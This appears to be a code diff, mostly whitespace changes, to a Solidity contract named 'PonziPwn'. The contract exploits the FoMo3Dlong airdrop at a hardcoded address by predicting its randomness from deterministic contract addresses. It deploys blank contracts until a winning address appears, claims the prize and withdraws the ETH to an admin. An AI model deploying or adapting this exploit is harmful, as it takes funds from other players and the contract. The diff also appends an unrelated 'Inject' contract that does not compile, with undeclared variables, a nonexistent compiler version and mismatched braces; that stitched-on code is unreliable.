@@ -6,8 +6,8 @@ interface FoMo3DlongInterface {
     function withdraw() external;
 }
 
-/* 
- * Contract addresses are deterministic. 
+/*
+ * Contract addresses are deterministic.
  * We find out how many deployments it'll take to get a winning contract address
  * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.
 */
@@ -36,20 +36,20 @@ contract AirDropWinner {
 
 contract PonziPwn {
     FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
-    
+
     address private admin;
     uint256 private blankContractGasLimit = 20000;
     uint256 private pwnContractGasLimit = 250000;
-       
+
     //gasPrice you'll use during the exploit
     uint256 private gasPrice = 10;
     uint256 private gasPriceInWei = gasPrice*1e9;
-    
+
     //cost of deploying each contract
     uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
     uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
     uint256 private maxAmount = 10 ether;
-    
+
     modifier onlyAdmin() {
         require(msg.sender == admin);
         _;
@@ -68,7 +68,7 @@ contract PonziPwn {
         uint256 _tracker = fomo3d.airDropTracker_();
         bool _canWin = false;
         while(!_canWin) {
-            /* 
+            /*
 	     * How the seed if calculated in fomo3d.
              * We input a new address each time until we get to a winning seed.
             */
@@ -81,7 +81,7 @@ contract PonziPwn {
                    (block.number)
             )));
 
-            //Tally number of contract deployments that'll result in a win. 
+            //Tally number of contract deployments that'll result in a win.
             //We tally the cost of deploying blank contracts.
             if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
                     _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
@@ -97,7 +97,7 @@ contract PonziPwn {
     }
 
     function deployContracts(uint256 _nContracts,address _newSender) private {
-        /* 
+        /*
 	 * deploy blank contracts until the final index at which point we first send ETH to the pregenerated address then deploy
          * an airdrop winning contract which will have that address;
         */
@@ -116,7 +116,7 @@ contract PonziPwn {
         uint256 _nContracts;
         address _newSender;
         (_pwnCost, _nContracts,_newSender) = checkPwnData();
-        
+
 	//check that the cost of executing the attack will make it worth it
         if(_pwnCost + 0.1 ether < maxAmount) {
            deployContracts(_nContracts,_newSender);
@@ -127,4 +127,15 @@ contract PonziPwn {
     function withdraw() public onlyAdmin() {
         admin.transfer(address(this).balance);
     }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
